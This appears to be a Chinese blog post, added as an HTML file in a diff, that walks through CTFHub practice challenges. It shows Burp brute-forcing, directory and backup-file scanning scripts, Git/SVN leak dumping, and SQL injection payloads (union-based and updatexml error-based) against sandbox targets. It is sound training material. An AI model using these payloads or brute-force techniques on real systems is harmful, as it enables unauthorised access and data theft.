@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ctfhub练习 |  b1xcy&#39;s blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ctfhub练习"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ctfhub练习
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/04/12/ctfhub%E7%BB%83%E4%B9%A0/" class="article-date">
+  <time datetime="2023-04-12T07:00:03.335Z" itemprop="datePublished">2023-04-12</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">16 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="Web前置技能"><a href="#Web前置技能" class="headerlink" title="Web前置技能"></a>Web前置技能</h1><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147545.png" alt="1"></p>
+<p>注意到题中要求使用CTF**B Method，故在Burp-Suite将GET方式改为CTFHUB（区分大小写）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147440.png" alt="2"></p>
+<p>将Intercept打开后打开浏览器并填入URL，将橙色标识中的GET方法改为CTFHUB后发送，得到如下flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147987.png" alt="flag"></p>
+<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>打开URL如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137392.png" alt="1"></p>
+<p>打开Intercept并进入HTTP history查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137699.png" alt="2"></p>
+<p>发现两处302跳转，查看得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137958.png" alt="flag"></p>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>打开URL如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138827.png" alt="1"></p>
+<p>得知要使用admin登陆</p>
+<p>刷新拦截一下请求</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138275.png" alt="2"></p>
+<p>将admin&#x3D;0改为admin&#x3D;1并发送，得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138254.png" alt="flag"></p>
+<h3 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h3><p>打开URL点击click</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152145795.png" alt="1"></p>
+<p>在HTTP history中查看response，注意到认证提示“Basic realm&#x3D;”Do u know admin ?””</p>
+<p>猜测登陆用户名为admin</p>
+<p>输入用户名密码后抓包，看到base64加密后的字符</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152145934.png" alt="2"></p>
+<p>在解码器中发现是账号:密码的格式，而账号为admin</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146262.png" alt="3"></p>
+<p>使用爆破模块intruder</p>
+<p>将该请求发送到intruder，将basic后面的字符选中并点击右侧Add§</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146966.png" alt="4"></p>
+<p>进入payloads导入ctfhub给的密码本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146548.png" alt="5"></p>
+<p>同时添加前缀admin:（注意中间的:）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146884.png" alt="6"></p>
+<p>添加base64编码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146899.png" alt="7"></p>
+<p>取消url编码，不然&#x3D;会被转化为%3d</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146329.png" alt="8"></p>
+<p>开始爆破</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146048.png" alt="9"></p>
+<p>筛选状态200并查看返回值，得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146336.png" alt="flag"></p>
+<h3 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h3><p>打开URL发现是游戏</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147675.png" alt="1"></p>
+<p>打开源代码发现flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147590.png" alt="flag"></p>
+<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h4 id="法一：Burp-Suite"><a href="#法一：Burp-Suite" class="headerlink" title="法一：Burp Suite"></a>法一：Burp Suite</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149039.png" alt="0"></p>
+<p>注意到目录为4*4的文件夹</p>
+<p>进入到最后一级目录，发送URL到intruder中</p>
+<p>分别选择攻击类型：cluster bomb，选择变化的位置，设置payload的sets和options</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149124.png" alt="1"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149552.png" alt="2"></p>
+<p>设置完成后开始</p>
+<p>在结果页中发现长度明显不一致的返回，查看返回内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150023.png" alt="3"></p>
+<p>从而得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150584.png" alt="flag"></p>
+<h4 id="法二：python"><a href="#法二：python" class="headerlink" title="法二：python"></a>法二：python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-0b7cf3fe1d9ef811.sandbox.ctfhub.com:10800/flag_in_here&quot;</span><span class="comment">#靶机url</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#i为0-4的数</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#j为0-4的数</span></span><br><span class="line">        url_final = url + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(j)<span class="comment">#将最终的目录拼接出来</span></span><br><span class="line">        r = requests.get(url_final)<span class="comment">#获得服务器返回的Response</span></span><br><span class="line">        r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        get_file=r.text<span class="comment">#得到text内容</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> get_file:<span class="comment">#判断flag是否在返回值中</span></span><br><span class="line">            <span class="built_in">print</span>(url_final)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下，得到flag目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150607.png" alt="4"></p>
+<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>打开目标url，进入phpinfo界面</p>
+<p>搜索flag关键词得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148724.png" alt="flag"></p>
+<h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><h4 id="法一：Burp-Suite-1"><a href="#法一：Burp-Suite-1" class="headerlink" title="法一：Burp Suite"></a>法一：Burp Suite</h4><p>打开url发现提示给了常见的文件及后缀名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155349.png" alt="1"></p>
+<p>进入bs浏览器，随便输一个，例如:web.tar尝试访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155308.png" alt="2"></p>
+<p>在历史记录中将该次访问发送到intruder中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155837.png" alt="3"></p>
+<p>在源代码中选择攻击类型并选中web和tar</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155045.png" alt="4"></p>
+<p>payloads中载入要变化的文件名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155514.png" alt="5"></p>
+<p>填写两个set后开始攻击，找到状态为200的文件，下载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155141.png" alt="6"></p>
+<p>得到flag.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155970.png" alt="7"></p>
+<p>将该文件放入浏览器中尝试打开得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155598.png" alt="flag"></p>
+<h4 id="法二-dirsearch"><a href="#法二-dirsearch" class="headerlink" title="法二:dirsearch"></a>法二:dirsearch</h4><p>在dirsearch目录中打开powershell，执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-584841b234301423.sandbox.ctfhub.com:10800 -e tar,tar.gz,zip,rar -x 502,503</span><br></pre></td></tr></table></figure>
+
+<p>执行完成后得到备份文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155127.png" alt="8"></p>
+<p>后续步骤同法一</p>
+<h4 id="法三-python"><a href="#法三-python" class="headerlink" title="法三:python"></a>法三:python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://challenge-584841b234301423.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line">list1=[<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">list2=[<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        url_final=url+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">            <span class="built_in">print</span>(url_final)</span><br></pre></td></tr></table></figure>
+
+<h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>打开URL有：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154080.png" alt="1"></p>
+<p>使用dirsearch扫描文件</p>
+<p>在dirsearch目录执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-b2eb848d1933d253.sandbox.ctfhub.com:10800 -e * -x 502,503</span><br></pre></td></tr></table></figure>
+
+<p>等待扫描完成发现有index.php.bak文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154858.png" alt="2"></p>
+<p>直接下载.bak文件打开发现flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154439.png" alt="flag"></p>
+<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><h4 id="法一-dirsearch"><a href="#法一-dirsearch" class="headerlink" title="法一:dirsearch"></a>法一:dirsearch</h4><p>打开URL得到提示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154166.png" alt="1"></p>
+<p>使用dirsearch扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-9a421211667ab5ac.sandbox.ctfhub.com:10800 -e swp -x 502,503</span><br></pre></td></tr></table></figure>
+
+<p>主动选择.swp的后缀是因为-e *默认不包括swp文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154664.png" alt="2"></p>
+<p>下载index.php.swp后放入linux中使用vim打开</p>
+<p>先使用mv将index.php.swp改名为.index.php.swp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv index.php.swp .index.php.swp</span><br></pre></td></tr></table></figure>
+
+<p>再使用vim打开index.php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154013.png" alt="3"></p>
+<p>按R选择恢复得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154710.png" alt="flag"></p>
+<h4 id="法二-直接访问"><a href="#法二-直接访问" class="headerlink" title="法二:直接访问"></a>法二:直接访问</h4><p>由题目可得要求得到vim缓存文件</p>
+<p>故直接访问.index.php.swp(swp,swo,swn)</p>
+<p>得到index.php.swp文件后同法一</p>
+<h4 id="法三-curl（未成功）"><a href="#法三-curl（未成功）" class="headerlink" title="法三:curl（未成功）"></a>法三:curl（未成功）</h4><p>可以直接使用curl命令查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://challenge-9a421211667ab5ac.sandbox.ctfhub.com:10800/.index.php.swp</span><br></pre></td></tr></table></figure>
+
+<p>但出现问题：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154095.png" alt="4"></p>
+<h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><h4 id="法一-dirsearch-linux查看"><a href="#法一-dirsearch-linux查看" class="headerlink" title="法一:dirsearch+linux查看"></a>法一:dirsearch+linux查看</h4><p>dirsearch开扫</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153541.png" alt="1"></p>
+<p>得到.DS_Store文件，丢到浏览器下载后在linux内打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153667.png" alt="2"></p>
+<p>在看到.txt文件，丢到浏览器中打开得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153584.png" alt="flag"></p>
+<h4 id="法二-dirsearch-python-dsstore查看"><a href="#法二-dirsearch-python-dsstore查看" class="headerlink" title="法二:dirsearch+python dsstore查看"></a>法二:dirsearch+python dsstore查看</h4><p>同法一，得到DS_Store</p>
+<p>将得到的文件用dsstore打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153738.png" alt="3"></p>
+<p>得到.txt文件</p>
+<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p>dirsearch开扫</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152151130.png" alt="1"></p>
+<p>看到有.git文件夹，用githack下下来（仅支持python2）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 Githack.py http://challenge-b4001d8a6ccbd18d.sandbox.ctfhub.com:10800/.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152151227.png" alt="2"></p>
+<p>去到.git同级目录，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
+
+<p>查看之前对仓库的操作，发现第二次添加了flag，考虑恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD^</span><br></pre></td></tr></table></figure>
+
+<p>得到历史文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152579.png" alt="3"></p>
+<p>查看.txt文件得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152969.png" alt="flag"></p>
+<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="法一：git-differ"><a href="#法一：git-differ" class="headerlink" title="法一：git differ"></a>法一：git differ</h4><p>dirsearch开扫</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152466.png" alt="1"></p>
+<p>发现.git，用hackgit抓下来，得到.git文件夹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152801.png" alt="2"></p>
+<p>进入.git&#x2F;refs，查看stash文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152478.png" alt="3"></p>
+<p>在gtihash中对比一下，得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152396.png" alt="flag"></p>
+<h4 id="法二：git-stash-pop"><a href="#法二：git-stash-pop" class="headerlink" title="法二：git stash pop"></a>法二：git stash pop</h4><p>得到.git文件夹后，直接查看stash</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152860.png" alt="5"></p>
+<p>执行<code>git stash pop</code>发现弹出文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152563.png" alt="6"></p>
+<p>查看该文件得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152465.png" alt="flag-2"></p>
+<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>dirsearch开扫</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150785.png" alt="1"></p>
+<p>看到有.git文件，用githack抓出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 .\GitHack.py http://challenge-241983fae914b573.sandbox.ctfhub.com:10800/.git`</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150576.png" alt="2"></p>
+<p>进入目录直接看到.txt文件，打开得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150144.png" alt="flag"></p>
+<h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p>dirsearch扫出来有.svn目录，用dvcs-ripper找一下svn</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148622.png" alt="1"></p>
+<p>进入.svn目录（隐藏文件夹，要用ls -a查看），在pristine目录中有两个文件夹，找到旧版的（08）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148364.png" alt="2"></p>
+<p>cat查看文件得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148693.png" alt="flag"></p>
+<h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>dirsearch开扫发现有.hg残留，在kali中用dvcs-ripper找一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148718.png" alt="1"></p>
+<p>发现部分404，但是在store-fncache中仍有文件显示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148457.png" alt="2"></p>
+<p>拼接url+flag得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148992.png" alt="flag"></p>
+<h1 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h1><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>burp里抓包登陆请求，发送到爆破模组里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152134978.png" alt="1"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152134686.png" alt="2"></p>
+<p>选上下面的用户密码，用集束炸弹方式攻击</p>
+<p>payload1,2分别使用简单的弱口令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152135801.png" alt="3"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152136869.png" alt="4"></p>
+<p>选中长度排序，得到爆破成功的的对应密码，查看response得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152136843.png" alt="flag"></p>
+<h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><p>打开是网关登陆界面，还有验证码，那就没法用intruder爆破密码了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190031447.png" alt="image-20221019003140324"></p>
+<p>随便试一个账号密码，显示用户不存在</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190032401.png" alt="image-20221019003216381"></p>
+<p>查看源代码发现是“亿邮邮件网关”，结合title的“默认口令”，试一下是否是出厂的默认设置</p>
+<p>直接搜该网关的管理用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190034857.png" alt="image-20221019003431841"></p>
+<p>丢进去登陆得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190035364.png" alt="image-20221019003507338"></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308082747549.png" alt="image-20230308082747549"></p>
+<p>敲<code>1 and 1=1</code>不报错，<code>1 and 1=2</code>报错，说明整数注入，直接猜列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 order by x</span><br></pre></td></tr></table></figure>
+
+<p>x为数字</p>
+<p>当x&#x3D;3时报错，说明只有两列</p>
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083107879.png" alt="image-20230308083107879"></p>
+<p>联合查询，让查询的id&#x3D;-1，使得前面<code>select * from news where id=1</code>错误，回显后面的union字段</p>
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083202386.png" alt="image-20230308083202386"></p>
+<p>查到当前数据库名为sqli</p>
+<p>继续爆表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083452750.png" alt="image-20230308083452750"></p>
+<p>得到sqli的库中两个表为flag和news</p>
+<p>查flag表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083655706.png" alt="image-20230308083655706"></p>
+<p>拿flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,flag from sqli.flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083728106.png" alt="image-20230308083728106"></p>
+<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>输入<code>1&#39;</code>报错而<code>1&quot;</code>不报错，说明本次用的是<code>&#39;</code>分割</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by x #</span><br></pre></td></tr></table></figure>
+
+<p>查列数</p>
+<p>x&#x3D;3报错</p>
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090536133.png" alt="image-20230308090536133"></p>
+<p>联合查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database() #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090612874.png" alt="image-20230308090612874"></p>
+<p>爆出库名，继续爆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090757323.png" alt="image-20230308090757323"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091240197.png" alt="image-20230308091240197"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,flag from sqli.flag #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091314140.png" alt="image-20230308091314140"></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>先order by找一下列数</p>
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091711580.png" alt="image-20230308091711580"></p>
+<p>报错注入可以用<code>updatexml(1,2,3)</code>函数，当第二个参数含特殊符号时报错，同时将第二个参数的内容显示在报错信息里</p>
+<p>特殊符号用0x7e -&gt; ~</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database()),3)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092106795.png" alt="image-20230308092106795"></p>
